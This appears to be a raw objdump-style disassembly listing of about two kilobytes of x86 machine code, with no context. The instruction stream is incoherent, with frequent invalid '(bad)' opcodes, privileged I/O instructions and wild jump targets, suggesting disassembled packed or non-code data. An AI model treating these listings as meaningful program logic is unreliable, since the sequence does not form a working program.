  4a22d6:	add    BYTE PTR [ecx+0x14],bh
  4a22d9:	jb     0x4a2268
  4a22db:	push   ecx
  4a22dc:	jae    0x4a22ca
  4a22de:	stc    
  4a22df:	add    DWORD PTR [esp+ebx*1+0x4d3dec73],eax
  4a22e6:	add    BYTE PTR [eax],al
  4a22e8:	jno    0x4a2326
  4a22ea:	nop
  4a22eb:	pop    es
  4a22ec:	test   BYTE PTR [eax],dh
  4a22ee:	dec    ebp
  4a22ef:	jno    0x4a2341
  4a22f1:	outs   dx,DWORD PTR ds:[esi]
  4a22f2:	enter  0x9001,0x47
  4a22f6:	jne    0x4a2300
  4a22f8:	jne    0x4a2302
  4a22fa:	fwait
  4a22fb:	inc    ecx
  4a22fc:	push   ds
  4a22fd:	inc    eax
  4a22fe:	add    edi,ecx
  4a2300:	add    DWORD PTR [esp+ecx*2],edx
  4a2303:	cmp    al,0xa
  4a2305:	jns    0x4a2327
  4a2307:	push   ebp
  4a2308:	dec    edi
  4a2309:	jbe    0x4a232f
  4a230b:	add    BYTE PTR [edx+0xe],al
  4a230e:	xor    BYTE PTR [esi+0x24],0x3
  4a2312:	(bad)  [edx+esi*8]
  4a2315:	add    eax,0x4af8014b
  4a231a:	add    ah,ah
  4a231c:	push   ecx
  4a231d:	enter  0x4e39,0x77
  4a2321:	inc    eax
  4a2322:	nop
  4a2323:	pop    es
  4a2324:	adc    BYTE PTR [edx+0x77],dh
  4a2327:	inc    eax
  4a2328:	retf   
  4a2329:	test   cl,0xb0
  4a232c:	mov    al,BYTE PTR [esi+0xe]
  4a232f:	fmul   QWORD PTR [ecx+0x37]
  4a2332:	add    dl,dh
  4a2334:	sub    ah,ah
  4a2336:	sbb    eax,0xf25c784d
  4a233b:	add    ecx,DWORD PTR [eax]
  4a233d:	cmp    DWORD PTR [eax+0x5c],edi
  4a2340:	int    0x48
  4a2342:	add    BYTE PTR [eax],al
  4a2344:	fadd   DWORD PTR [eax+eiz*1+0x48c0840f]
  4a234b:	jo     0x4a2388
  4a234d:	icebp  
  4a234e:	pop    ebp
  4a234f:	push   ss
  4a2350:	xchg   esi,eax
  4a2351:	ins    BYTE PTR es:[edi],dx
  4a2352:	cmp    bh,bh
  4a2354:	dec    ebx
  4a2355:	xor    edi,DWORD PTR [ebx]
  4a2357:	and    al,0xe4
  4a2359:	xor    al,BYTE PTR [edx+0x6f793b16]
  4a235f:	inc    ebx
  4a2360:	xchg   edi,eax
  4a2361:	or     esi,DWORD PTR cs:[ebx]
  4a2364:	stc    
  4a2365:	add    DWORD PTR [edi],ebp
  4a2367:	mul    BYTE PTR [ebp-0x1f]
  4a236a:	adc    bh,BYTE PTR [esi]
  4a236c:	xor    edi,DWORD PTR [edi]
  4a236e:	push   ss
  4a236f:	icebp  
  4a2370:	push   ss
  4a2371:	mov    WORD PTR [ebx+0x17],?
  4a2374:	xchg   edx,eax
  4a2375:	aaa    
  4a2376:	push   0x6851976b
  4a237b:	add    edx,DWORD PTR [ecx]
  4a237d:	in     al,dx
  4a237e:	retf   
  4a237f:	inc    edx
  4a2380:	xor    esp,DWORD PTR [ecx-0x78]
  4a2383:	adc    BYTE PTR [edx-0x5dfb8744],dl
  4a2389:	add    esp,DWORD PTR [eax-0x4]
  4a238c:	mov    edx,0x1a743477
  4a2391:	pop    ebx
  4a2392:	xchg   edi,eax
  4a2393:	add    dh,al
  4a2395:	lahf   
  4a2396:	add    al,0x9a
  4a2398:	xchg   BYTE PTR [edi+0x3afb0047],ch
  4a239e:	jl     0x4a23db
  4a23a0:	inc    ebx
  4a23a1:	xchg   DWORD PTR [esi+0x2535eb10],esp
  4a23a7:	jle    0x4a23d9
  4a23a9:	cmp    BYTE PTR [esi],0x42
  4a23ac:	pop    ds
  4a23ad:	je     0x4a2335
  4a23af:	test   DWORD PTR [di+0x46],esi
  4a23b3:	pop    ebx
  4a23b4:	cmp    eax,0x3d168285
  4a23b9:	frstor [edi-0x35d85f77]
  4a23bf:	push   0x15293d7a
  4a23c4:	xchg   DWORD PTR [esi],ebx
  4a23c6:	enter  0xbb8e,0x6f
  4a23ca:	jg     0x4a244b
  4a23cc:	pusha  
  4a23cd:	add    ah,ch
  4a23cf:	in     al,0x4b
  4a23d1:	fimul  WORD PTR [edx-0x5b]
  4a23d4:	cmp    DWORD PTR [ecx],edi
  4a23d6:	dec    edx
  4a23d7:	push   cs
  4a23d8:	loope  0x4a239b
  4a23da:	cmp    dl,BYTE PTR [esi-0x2c859b9a]
  4a23e0:	push   ss
  4a23e1:	dec    esi
  4a23e2:	adc    eax,edi
  4a23e4:	in     eax,dx
  4a23e5:	and    edi,DWORD PTR [ebx]
  4a23e7:	add    cl,BYTE PTR [ebx-0x13]
  4a23ea:	dec    ebx
  4a23eb:	pop    es
  4a23ec:	or     esp,DWORD PTR [edx+0x25c948f]
  4a23f2:	in     eax,dx
  4a23f3:	inc    ebx
  4a23f4:	inc    esi
  4a23f5:	mov    ah,0xa4
  4a23f7:	arpl   cx,sp
  4a23f9:	in     al,dx
  4a23fa:	loop   0x4a244d
  4a23fc:	sub    eax,0x75f9291d
  4a2401:	add    ebp,ebp
  4a2403:	push   ebx
  4a2404:	inc    edi
  4a2405:	dec    edx
  4a2406:	es pop edx
  4a2408:	iret   
  4a2409:	add    al,0xec
  4a240b:	jge    0x4a2423
  4a240d:	lods   al,BYTE PTR ds:[esi]
  4a240e:	inc    esp
  4a240f:	push   cs
  4a2410:	xor    BYTE PTR [edi+0x3c],0xe6
  4a2414:	ror    DWORD PTR [edx-0x60],cl
  4a2417:	add    BYTE PTR [ebx+0xa],dl
  4a241a:	shl    dh,1
  4a241c:	sbb    BYTE PTR [esi],bl
  4a241e:	(bad)  
  4a241f:	dec    edx
  4a2420:	addr16 mov ebp,0x7cd386f3
  4a2426:	adc    DWORD PTR [eax],esp
  4a2428:	mov    ah,0xb9
  4a242a:	adc    BYTE PTR [esi],0xd2
  4a242d:	mov    esp,0xa3203493
  4a2432:	pop    edi
  4a2433:	and    BYTE PTR [ebp+ebp*1-0x229ff570],al
  4a243a:	mov    eax,ds:0xe882d100
  4a243f:	repnz out 0xa,al
  4a2442:	daa    
  4a2443:	jmp    0x2c473dbe
  4a2448:	das    
  4a2449:	and    BYTE PTR [edi+0x6f],ah
  4a244c:	add    BYTE PTR [eax],dh
  4a244e:	test   DWORD PTR [eax+ebp*4],edi
  4a2451:	jbe    0x4a2474
  4a2453:	pop    esi
  4a2454:	dec    edx
  4a2455:	stc    
  4a2456:	pop    eax
  4a2457:	dec    ecx
  4a2458:	and    BYTE PTR [edi],al
  4a245a:	inc    eax
  4a245b:	push   ds
  4a245c:	jl     0x4a24b7
  4a245e:	jl     0x4a24b9
  4a2460:	enter  0x6287,0x51
  4a2464:	or     esi,DWORD PTR [eax+0x57fffff1]
  4a246a:	mov    esp,0x18a37717
  4a246f:	or     ebx,DWORD PTR [edx+0x2e850a11]
  4a2475:	dec    ecx
  4a2476:	fcom   QWORD PTR [ecx+0x1d85213c]
  4a247c:	dec    ecx
  4a247d:	ins    DWORD PTR es:[edi],dx
  4a247e:	pop    eax
  4a247f:	mov    eax,0xb575e2b
  4a2484:	(bad)  
  4a2485:	jle    0x4a2492
  4a2487:	push   edi
  4a2488:	sub    ebx,ecx
  4a248a:	xor    al,0x90
  4a248c:	pop    edi
  4a248d:	or     eax,DWORD PTR [ebp-0x27e9b717]
  4a2493:	dec    eax
  4a2494:	in     al,0x51
  4a2496:	enter  0xd203,0x47
  4a249a:	jge    0x4a247b
  4a249c:	pop    ss
  4a249d:	add    eax,0xdf7d0072
  4a24a2:	test   DWORD PTR [eax-0x29],esi
  4a24a5:	xlat   BYTE PTR ds:[ebx]
  4a24a6:	or     eax,0xa6cdc7f1
  4a24ab:	and    BYTE PTR [ecx],0xf0
  4a24ae:	mul    ecx
  4a24b0:	nop
  4a24b1:	out    dx,eax
  4a24b2:	icebp  
  4a24b3:	or     eax,0x47b5860f
  4a24b8:	sub    BYTE PTR [ebp+0x41e43207],dh
  4a24be:	hlt    
  4a24bf:	pop    esp
  4a24c0:	test   eax,0x89479986
  4a24c5:	xchg   ebx,eax
  4a24c6:	inc    esi
  4a24c7:	cmp    DWORD PTR [eax],eax
  4a24c9:	repnz sub BYTE PTR [edi+0x1e],bh
  4a24cd:	jg     0x4a24ed
  4a24cf:	ds or  al,0x8b
  4a24d2:	add    bh,BYTE PTR [ebp-0x15]
  4a24d5:	out    dx,al
  4a24d6:	(bad)  
  4a24d7:	jmp    DWORD PTR [ecx]
  4a24d9:	ja     0x4a2513
  4a24db:	pop    esp
  4a24dc:	jg     0x4a24f2
  4a24de:	jge    0x4a2467
  4a24e0:	jbe    0x4a2528
  4a24e2:	xor    eax,0x65781436
  4a24e7:	inc    esi
  4a24e8:	daa    
  4a24e9:	pop    edx
  4a24ea:	aaa    
  4a24eb:	lock or DWORD PTR [eax],edi
  4a24ee:	test   al,0xa1
  4a24f0:	ror    BYTE PTR [edx],0x45
  4a24f3:	call   0x2820a245
  4a24f8:	cs adc al,0x62
  4a24fb:	or     al,0x82
  4a24fd:	xor    al,0xa
  4a24ff:	add    eax,0x7a8e688
  4a2504:	sub    BYTE PTR [edx],0x29
  4a2507:	in     al,dx
  4a2508:	sub    BYTE PTR [ebx],0xd1
  4a250b:	push   ds
  4a250c:	jg     0x4a251d
  4a250e:	in     eax,dx
  4a250f:	adc    al,0xe0
  4a2511:	mov    ds:0x7206eb70,al
  4a2516:	push   eax
  4a2517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a2518:	dec    esp
  4a2519:	fcom   st(6)
  4a251b:	inc    edx
  4a251c:	jb     0x4a2556
  4a251e:	mov    edx,0x54329ec2
  4a2523:	inc    esi
  4a2524:	das    
  4a2525:	outs   dx,DWORD PTR ds:[esi]
  4a2526:	add    DWORD PTR [eax-0x2df86a48],ecx
  4a252c:	mov    DWORD PTR [esi+0x50cb68d],edi
  4a2532:	cmp    BYTE PTR [ecx-0x64ec2390],cl
  4a2538:	pop    ebp
  4a2539:	sub    al,0x88
  4a253b:	shl    ah,0x88
  4a253e:	cwde   
  4a253f:	outs   dx,BYTE PTR ds:[esi]
  4a2540:	jl     0x4a254e
  4a2542:	and    BYTE PTR [eax+0x3c25404d],0x43
  4a2549:	in     al,dx
  4a254a:	outs   dx,DWORD PTR ds:[esi]
  4a254c:	pop    eax
  4a254d:	das    
  4a254e:	stos   DWORD PTR es:[edi],eax
  4a254f:	inc    ebp
  4a2550:	lahf   
  4a2551:	push   ss
  4a2552:	jmp    0x4a258f
  4a2554:	add    ah,BYTE PTR [ecx+0x0]
  4a2557:	or     al,0x10
  4a2559:	fwait
  4a255a:	loopne 0x4a25bd
  4a255c:	shr    BYTE PTR [eax+edx*2+0x410f4d3b],0x68
  4a2564:	add    DWORD PTR [edi],0xffffff90
  4a2567:	cmp    cl,al
  4a2569:	in     al,dx
  4a256a:	fbstp  TBYTE PTR [eax-0x15f33ecd]
  4a2570:	jno    0x4a25e7
  4a2572:	or     BYTE PTR [ebp-0x75],ch
  4a2575:	cli    
  4a2576:	ret    
  4a2577:	add    eax,0x104fd241
  4a257c:	jl     0x4a25fd
  4a257e:	loop   0x4a25bc
  4a2580:	(bad)  
  4a2581:	add    esi,eax
  4a2583:	mov    WORD PTR [edx-0x18],ds
  4a2586:	jl     0x4a25be
  4a2588:	sbb    BYTE PTR [eax-0x18],cl
  4a258b:	and    eax,0x194b2095
  4a2590:	sub    al,0x87
  4a2592:	sub    BYTE PTR [eax+0xa],cl
  4a2595:	push   es
  4a2596:	in     al,dx
  4a2597:	enter  0xf84a,0xdb
  4a259b:	retf   0x4569
  4a259e:	dec    edx
  4a259f:	daa    
  4a25a0:	pop    edx
  4a25a1:	scas   eax,DWORD PTR es:[edi]
  4a25a2:	mov    esp,0x45f07598
  4a25a7:	clc    
  4a25a8:	jle    0x4a257d
  4a25aa:	lds    ecx,FWORD PTR [edx]
  4a25ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a25ad:	test   eax,0x3592d820
  4a25b2:	mov    al,0xab
  4a25b4:	ins    BYTE PTR es:[edi],dx
  4a25b5:	(bad)  
  4a25b8:	xchg   esp,eax
  4a25b9:	inc    esp
  4a25ba:	sub    al,0x2e
  4a25bc:	mov    ah,dl
  4a25be:	add    DWORD PTR [eax+0x40],edx
  4a25c1:	sub    BYTE PTR [ecx+0x14],ah
  4a25c4:	ror    BYTE PTR [ebx],0xb0
  4a25c7:	adc    eax,0xc429b02c
  4a25cc:	jb     0x4a25cf
  4a25ce:	dec    esi
  4a25cf:	lock push esi
  4a25d1:	cli    
  4a25d2:	xor    ch,0xa0
  4a25d5:	add    BYTE PTR [edi+0x48],al
  4a25d8:	pop    edx
  4a25d9:	jmp    0xe444308b
  4a25de:	jp     0x4a2619
  4a25e0:	inc    edx
  4a25e1:	jge    0xad956874
  4a25e7:	and    BYTE PTR [ebx],cl
  4a25e9:	mov    bl,0xb9
  4a25eb:	call   0x165243c0
  4a25f0:	es push esi
  4a25f2:	push   ecx
  4a25f3:	pop    ss
  4a25f4:	in     eax,dx
  4a25f5:	inc    ebx
  4a25f6:	cmp    edi,eax
  4a25f8:	add    cl,al
  4a25fa:	rol    DWORD PTR [edi],0x1
  4a25fd:	and    bh,bh
  4a25ff:	and    BYTE PTR [edx+0x7],cl
  4a2602:	cmp    cl,BYTE PTR ss:[ebx]
  4a2605:	shl    DWORD PTR [edi+eiz*4-0x64],0x79
  4a260a:	inc    esp
  4a260b:	mov    al,0xd9
  4a260d:	mov    edi,0xe2944489
  4a2612:	push   esp
  4a2613:	sub    BYTE PTR [esi-0x37],bl
  4a2616:	(bad)  
  4a2617:	(bad)  
  4a2618:	mov    al,0x21
  4a261a:	das    
  4a261b:	sub    ebp,DWORD PTR [edi]
  4a261d:	ficomp WORD PTR [edi+0x50]
  4a2620:	mov    edx,0x8258fa83
  4a2625:	add    BYTE PTR [edx+0x20c695ce],dl
  4a262b:	dec    edi
  4a262c:	repz and al,dl
  4a262f:	and    edx,0x55
  4a2632:	nop
  4a2633:	pop    esi
  4a2634:	or     cl,ch
  4a2636:	bound  edx,QWORD PTR [ebx+0x2c]
  4a2639:	clc    
  4a263a:	or     edx,DWORD PTR [edi-0x1e]
  4a263d:	ret    
  4a263e:	adc    DWORD PTR [esi],esp
  4a2640:	push   cs
  4a2641:	clc    
  4a2642:	jmp    0x4a2692
  4a2644:	rol    BYTE PTR [eax],0x96
  4a2647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a2648:	pop    eax
  4a2649:	push   ebx
  4a264a:	shr    BYTE PTR [esi+ecx*1],0x84
  4a264e:	lds    edx,FWORD PTR [edx-0x49ac70ac]
  4a2654:	push   ss
  4a2655:	retf   
  4a2656:	rcr    DWORD PTR [esi],cl
  4a2658:	clc    
  4a2659:	add    esp,DWORD PTR [ecx+0x7]
  4a265c:	imul   edi,DWORD PTR [esi+0x1f],0x75
  4a2660:	sub    bl,BYTE PTR [esi-0x8]
  4a2663:	pop    ecx
  4a2664:	or     eax,0xa1d08b0d
  4a2669:	mov    eax,0xba3eeea9
  4a266e:	jnp    0x4a26af
  4a2670:	and    al,0x8b
  4a2672:	and    bl,BYTE PTR [edi-0x23]
  4a2675:	mov    ?,edx
  4a2677:	sbb    al,0x8c
  4a2679:	jno    0x4a268d
  4a267b:	leave  
  4a267c:	fld    QWORD PTR [ebx-0x1c]
  4a267f:	adc    BYTE PTR [edx],dh
  4a2681:	and    edi,ebp
  4a2683:	aam    0x82
  4a2685:	out    dx,al
  4a2686:	or     BYTE PTR [ecx],dl
  4a2688:	enter  0x8283,0xee
  4a268c:	mov    BYTE PTR [esi-0x6ec78f7a],dh
  4a2692:	jbe    0x4a269f
  4a2694:	or     dl,0xc4
  4a2697:	getsec 
  4a2699:	mov    edx,0x483e3384
  4a269e:	and    ecx,DWORD PTR [ebx+0x478181c8]
  4a26a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a26a5:	sar    BYTE PTR [edx+0x1f767ce2],1
  4a26ab:	inc    edi
  4a26ac:	jbe    0x4a272a
  4a26ae:	mov    al,BYTE PTR [eax+ecx*1]
  4a26b1:	test   al,dl
  4a26b3:	outs   dx,BYTE PTR ds:[esi]
  4a26b4:	xchg   ebx,eax
  4a26b5:	inc    edx
  4a26b6:	dec    ebp
  4a26b7:	cld    
  4a26b8:	bound  edi,QWORD PTR [ecx]
  4a26ba:	mov    ds:0x558ec0dd,eax
  4a26bf:	into   
  4a26c0:	mov    ss,ebx
  4a26c2:	mov    edx,0x3a142eb
  4a26c7:	mov    dh,0xfc
  4a26c9:	jo     0x4a269b
  4a26cb:	jl     0x4a2708
  4a26cd:	imul   esp,eax,0x42
  4a26d0:	xchg   DWORD PTR [edi+0x3a],edi
  4a26d3:	push   ebx
  4a26d4:	mov    edx,0x604e8946
  4a26d9:	mov    ss,WORD PTR [ecx]
  4a26db:	ret    0xc87e
  4a26de:	and    bl,BYTE PTR [ebx+0x55be431e]
  4a26e4:	hlt    
  4a26e5:	or     ch,BYTE PTR [edi]
  4a26e7:	fbstp  TBYTE PTR [ecx]
  4a26e9:	shl    BYTE PTR [edx+eax*1+0x407b108a],cl
  4a26f0:	dec    eax
  4a26f1:	xor    al,0x0
  4a26f3:	gs dec ecx
  4a26f5:	xor    BYTE PTR [eax],bh
  4a26f7:	push   cs
  4a26f8:	rcl    cl,cl
  4a26fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a26fb:	outs   dx,BYTE PTR ds:[esi]
  4a26fc:	int3   
  4a26fd:	and    al,0x9
  4a26ff:	cdq    
  4a2700:	and    bl,BYTE PTR [esi]
  4a2702:	dec    ebp
  4a2703:	dec    edi
  4a2704:	and    eax,0x57573b19
  4a2709:	cmp    al,0xa6
  4a270b:	inc    ebp
  4a270c:	popf   
  4a270d:	pop    ds
  4a270e:	fld    DWORD PTR [ecx-0x57]
  4a2711:	inc    ecx
  4a2712:	or     BYTE PTR [ecx+0x1342903b],0xa2
  4a2719:	loopne 0x4a276c
  4a271b:	cmp    DWORD PTR [ebx+0x4c],0xc7672c47
  4a2722:	add    eax,0x42040d58
  4a2727:	fistp  WORD PTR [edx]
  4a2729:	add    ebx,edx
  4a272b:	cmp    BYTE PTR [edx-0x4c],dl
  4a272e:	or     ebp,DWORD PTR [edx-0x3e51f476]
  4a2734:	ja     0x4a27aa
  4a2736:	or     edx,DWORD PTR [eax-0x6dfffa69]
  4a273c:	ficom  WORD PTR [ebp-0x1b0ff12a]
  4a2742:	ror    DWORD PTR [esi-0x48],1
  4a2745:	cdq    
  4a2746:	inc    esp
  4a2747:	stc    
  4a2748:	dec    ebp
  4a2749:	or     eax,0x8808e477
  4a274e:	mov    al,ds:0x46539367
  4a2753:	jmp    0x4a27af
  4a2755:	push   ecx
  4a2756:	in     al,dx
  4a2757:	cdq    
  4a2758:	sti    
  4a2759:	xchg   esp,eax
  4a275a:	sbb    DWORD PTR [edx-0x37747794],esp
  4a2760:	mov    ds:0xd90af977,eax
  4a2765:	or     ah,bh
  4a2767:	sub    BYTE PTR [edi+0x79024121],bh
  4a276d:	xchg   ebp,eax
  4a276e:	sbb    al,0x85
  4a2770:	mov    edi,0xc042bf85
  4a2775:	add    BYTE PTR [ebx+0x42138e34],al
  4a277b:	jnp    0x4a2764
  4a277d:	sar    cl,cl
  4a277f:	sti    
  4a2780:	pusha  
  4a2781:	cmp    ebx,ebp
  4a2783:	cmp    cl,BYTE PTR [ecx]
  4a2785:	pop    ebx
  4a2786:	fs dec ebp
  4a2788:	outs   dx,BYTE PTR ds:[esi]
  4a2789:	mov    ds,ebx
  4a278b:	and    esi,esp
  4a278d:	inc    eax
  4a278e:	repnz in al,0x3
  4a2791:	out    dx,al
  4a2792:	mov    ebp,0x7945c8dc
  4a2797:	ret    
  4a2798:	jmp    0xc79ef7d5
  4a279d:	sbb    DWORD PTR ds:0xe74553f9,edi
  4a27a3:	js     0x4a276d
  4a27a5:	add    ecx,edi
  4a27a7:	inc    esp
  4a27a8:	out    dx,al
  4a27a9:	inc    esp
  4a27aa:	(bad)  [edx]
  4a27ac:	inc    esp
  4a27ad:	rcl    DWORD PTR [edx],cl
  4a27af:	push   cs
  4a27b0:	and    bl,cl
  4a27b2:	dec    esi
  4a27b3:	outs   dx,BYTE PTR ds:[esi]
  4a27b4:	or     ah,al
  4a27b6:	jmp    0x72b39abf
  4a27bb:	and    dl,bl
  4a27bd:	mov    eax,edx
  4a27bf:	mov    eax,0x2502be02
  4a27c4:	jb     0x4a27f6
  4a27c6:	sbb    al,0x5
  4a27c8:	mov    eax,0xe6835602
  4a27cd:	jmp    0x4a27f5
  4a27cf:	add    BYTE PTR [edi],al
  4a27d1:	sub    cl,BYTE PTR [edi-0x25]
  4a27d4:	dec    edx
  4a27d5:	das    
  4a27d6:	jmp    0x4a27f2
  4a27d8:	push   ss
  4a27d9:	or     BYTE PTR [esi+ecx*1],al
  4a27dc:	leave  
  4a27dd:	clc    
  4a27de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a27df:	fs pop ss
  4a27e1:	in     al,dx
  4a27e2:	nop
  4a27e3:	mov    eax,DWORD PTR [esi+eax*4-0x31d4693e]
  4a27ea:	mov    eax,0xd81f0b1a
  4a27ef:	(bad)  
  4a27f0:	test   DWORD PTR [esi-0x7c],0xfe0bdb50
  4a27f7:	add    eax,DWORD PTR [ecx+0x68]
  4a27fa:	mov    cl,BYTE PTR [esi]
  4a27fc:	dec    eax
  4a27fd:	inc    esi
  4a27fe:	inc    ebx
  4a27ff:	cmp    dl,cl
  4a2801:	add    cl,BYTE PTR [edx+0x3a]
  4a2804:	(bad)  
  4a2806:	jl     0x4a286e
  4a2808:	sub    eax,0xb9e7ebbc
  4a280d:	test   eax,0xaa1d99be
  4a2812:	mov    WORD PTR [eax+0x3504701],cs
  4a2818:	lock cmp BYTE PTR [ebx+0x1],cl
  4a281c:	or     BYTE PTR [ebp-0x3e],0x69
  4a2820:	and    DWORD PTR [ebp-0x427bf100],ebx
  4a2826:	lods   eax,DWORD PTR ds:[esi]
  4a2827:	sub    DWORD PTR [edx],eax
  4a2829:	sub    eax,DWORD PTR [ebx-0x24]
  4a282c:	jno    0x4a285a
  4a282e:	pop    eax
  4a282f:	aas    
  4a2830:	test   DWORD PTR [edi+0x381831d3],esi
  4a2836:	lea    ebx,[ecx]
  4a2838:	imul   esi,DWORD PTR [esi-0x4f8c1e50],0x80716b71
  4a2842:	mov    BYTE PTR [edi],cl
  4a2844:	xor    al,0x20
  4a2846:	(bad)  
  4a2847:	push   cs
  4a2848:	aad    0x19
  4a284a:	push   0x99047c17
  4a284f:	(bad)  
  4a2850:	rcl    DWORD PTR [ecx+0x3],0xc6
  4a2854:	and    BYTE PTR [ebx+edx*8+0x15],cl
  4a2858:	jb     0x4a2813
  4a285a:	pop    ds
  4a285b:	xor    al,0x6
  4a285d:	jecxz  0x4a2820
  4a285f:	int    0x26
  4a2861:	mov    ecx,0xbc66e1b9
  4a2866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a2867:	mov    ch,0xe5
  4a2869:	xchg   esi,eax
  4a286a:	sub    al,0x47
  4a286c:	jge    0x4a28bd
  4a286e:	test   BYTE PTR [esi+ebp*8+0x5b99775],dh
  4a2875:	pop    edi
  4a2876:	ss push esi
  4a2878:	add    eax,esp
  4a287a:	ficomp DWORD PTR [ebp+0x5e05296e]
  4a2880:	iret   
  4a2881:	push   es
  4a2882:	(bad)  
  4a2883:	mov    al,0xf0
  4a2885:	nop
  4a2886:	sar    DWORD PTR [ebx],0xa8
  4a2889:	add    dl,al
  4a288b:	aas    
  4a288c:	dec    ebp
  4a288d:	scas   eax,DWORD PTR es:[edi]
  4a288e:	inc    esi
  4a288f:	ja     0x4a289f
  4a2891:	xor    BYTE PTR [ebx+0x25],0x8b
  4a2895:	inc    edi
  4a2896:	xor    BYTE PTR [esi-0x436dcfad],dh
  4a289c:	and    BYTE PTR [ebx+0x38],al
  4a289f:	or     al,0x80
  4a28a1:	push   cs
  4a28a2:	(bad)  
  4a28a3:	or     eax,0xadda7130
  4a28a8:	xchg   WORD PTR [edx],di
  4a28ab:	jo     0x4a28be
  4a28ad:	cwde   
  4a28ae:	cmp    eax,DWORD PTR [ecx+0x6ab9d57a]
  4a28b4:	adc    eax,DWORD PTR [ecx-0x27]
  4a28b7:	retf   0x9c08
  4a28ba:	cs mov ecx,0xca308903
  4a28c0:	pop    ebx
  4a28c1:	adc    eax,0x53de265f
  4a28c6:	out    0x41,eax
  4a28c8:	adc    DWORD PTR [ebx],0x4168de49
  4a28ce:	pop    eax
  4a28cf:	add    bh,BYTE PTR [ecx-0x7f]
  4a28d2:	mov    dh,0x6a
  4a28d4:	fst    DWORD PTR [ebx+0x6a]
  4a28d7:	add    eax,ecx
  4a28d9:	scas   al,BYTE PTR es:[edi]
  4a28da:	dec    ebp
  4a28db:	and    al,0xd9
  4a28dd:	popa   
  4a28de:	and    BYTE PTR [ecx],dh
  4a28e0:	leave  
  4a28e1:	sbb    edi,DWORD PTR [eax+0x4]
  4a28e4:	add    eax,0xc402ee4a
  4a28e9:	jp     0x4a2921
  4a28eb:	test   BYTE PTR [ebx-0x27],dh
  4a28ee:	popa   
  4a28ef:	xor    eax,edi
  4a28f1:	ror    DWORD PTR ds:0x3af1c8b1,1
  4a28f7:	mov    ?,WORD PTR [edi+0x6e7fe1c7]
  4a28fd:	inc    ebx
  4a28fe:	mov    cl,BYTE PTR [ecx+eax*1]
  4a2901:	inc    esi
  4a2902:	cmp    BYTE PTR [edx+eax*1],cl
  4a2905:	les    eax,FWORD PTR ds:0x3dc9214e
  4a290b:	cmp    al,0xcd
  4a290d:	clc    
  4a290e:	sahf   
  4a290f:	pushf  
  4a2910:	cmp    ah,bh
  4a2912:	ds pop ds
  4a2914:	cmp    BYTE PTR [edx-0x27611edb],cl
  4a291a:	inc    edx
  4a291b:	xchg   DWORD PTR [ecx-0x7cb835d],ecx
  4a2921:	dec    ebx
  4a2922:	add    dl,BYTE PTR [edx-0x7]
  4a2925:	nop
  4a2926:	cmp    BYTE PTR [ebx],0x26
  4a2929:	div    DWORD PTR [ebx-0x1f]
  4a292c:	xchg   esp,eax
  4a292d:	jp     0x4a2985
  4a292f:	xchg   edx,eax
  4a2930:	pop    ebp
  4a2931:	jmp    0x4a2991
  4a2933:	or     eax,0xadad0b75
  4a2938:	xbegin 0xb7be735e
  4a293e:	push   esp
  4a293f:	mov    ds,WORD PTR ds:0x22343b55
  4a2945:	lahf   
  4a2946:	add    al,BYTE PTR [edx+0x2f20c6cf]
  4a294c:	and    DWORD PTR [edx+0x79232da6],0x77
  4a2953:	sub    dh,BYTE PTR [eax-0x12]
  4a2956:	jbe    0x4a28d9
  4a2958:	inc    esp
  4a2959:	adc    ah,BYTE PTR [eax-0x27f47eba]
  4a295f:	dec    eax
  4a2960:	jns    0x4a2973
  4a2962:	dec    edx
  4a2963:	cwde   
  4a2964:	mov    BYTE PTR [ebp-0x15f44947],ch
  4a296a:	jl     0x4a28f6
  4a296c:	pop    es
  4a296d:	add    al,0xb8
  4a296f:	add    bh,BYTE PTR [ecx-0x6ea322a8]
  4a2975:	dec    ecx
  4a2976:	sbb    al,ch
  4a2978:	push   edi
  4a2979:	fist   WORD PTR [edx]
  4a297b:	shl    dl,cl
  4a297d:	dec    ebp
  4a297e:	cmp    DWORD PTR [edx-0x18d374e9],0x1e
  4a2985:	fidiv  WORD PTR [ecx]
  4a2987:	pusha  
  4a2988:	jo     0x4a295b
  4a298a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a298b:	int    0x44
  4a298d:	add    edx,DWORD PTR [edi]
  4a298f:	xchg   edx,eax
  4a2990:	out    0x49,al
  4a2992:	or     BYTE PTR [ebp+0x27],dh
  4a2995:	pop    es
  4a2996:	pop    ebp
  4a2997:	imul   esi,ecx,0x69
  4a299a:	dec    eax
  4a299b:	add    ebx,DWORD PTR [ebx]
  4a299d:	jne    0x4a298e
  4a299f:	xor    edx,DWORD PTR [esi+0xe]
  4a29a2:	jmp    0x6f4d72a9
  4a29a7:	add    al,0x5
  4a29a9:	pop    ebp
  4a29aa:	or     BYTE PTR [ebp+edx*2+0x7d01643d],ah
  4a29b1:	add    eax,0x21a660c3
  4a29b6:	cmp    esp,edi
  4a29b8:	in     al,dx
  4a29b9:	xor    al,0x61
  4a29bb:	cmp    cl,0x8
  4a29be:	outs   dx,BYTE PTR ds:[esi]
  4a29bf:	mov    ?,WORD PTR [edx]
  4a29c1:	jl     0x4a2947
  4a29c3:	or     esp,DWORD PTR [ecx-0x66]
  4a29c6:	and    DWORD PTR [esp+edx*1],edi
  4a29c9:	ret    0x4f52
  4a29cc:	sub    al,0x2e
  4a29ce:	adc    ch,BYTE PTR [edx+esi*8+0x6f]
  4a29d2:	fadd   st(5),st
  4a29d4:	retw   0x15a
  4a29d8:	leave  
  4a29d9:	div    al
  4a29db:	add    dh,BYTE PTR [ebx+0x61]
  4a29de:	push   ebx
  4a29df:	cmp    bl,BYTE PTR [ecx]
  4a29e1:	lock inc eax
  4a29e3:	add    esi,edx
  4a29e5:	inc    edi
  4a29e6:	dec    esi
  4a29e7:	sub    DWORD PTR ds:0x3dc77e45,0x9d85d71e
  4a29f1:	dec    ebp
  4a29f2:	inc    eax
  4a29f3:	dec    eax
  4a29f4:	mov    esp,0xc675da42
  4a29f9:	in     al,dx
  4a29fa:	aad    0xde
  4a29fc:	cs xchg esi,eax
  4a29fe:	push   edx
  4a29ff:	scas   eax,DWORD PTR es:[edi]
  4a2a00:	ja     0x4a2a2a
